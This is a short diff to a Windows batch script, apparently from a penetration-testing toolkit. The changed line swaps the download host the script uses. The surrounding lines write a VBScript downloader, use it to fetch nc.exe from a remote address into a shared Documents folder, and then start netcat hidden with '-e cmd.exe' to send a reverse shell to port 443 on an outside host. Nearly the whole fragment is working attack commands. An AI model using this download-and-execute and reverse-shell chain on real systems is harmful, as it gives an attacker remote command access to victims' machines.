@@ -16,7 +16,7 @@ echo bStrm.write xHttp.responseBody >> dl.vbs
 timeout 1
 echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
 timeout 1
-dl.vbs "http://10.11.0.60/nc.exe" "c:\Documents and Settings\All Users\Documents\nc.exe"
+dl.vbs "http://1.1.1.1/nc.exe" "c:\Documents and Settings\All Users\Documents\nc.exe"
 timeout 1
 start "nc" /d "c:\Documents and Settings\All Users\Documents\" /min /b "c:\Documents and Settings\All Users\Documents\nc.exe" -nv 1.1.1.1 443 -e cmd.exe
 echo Done!
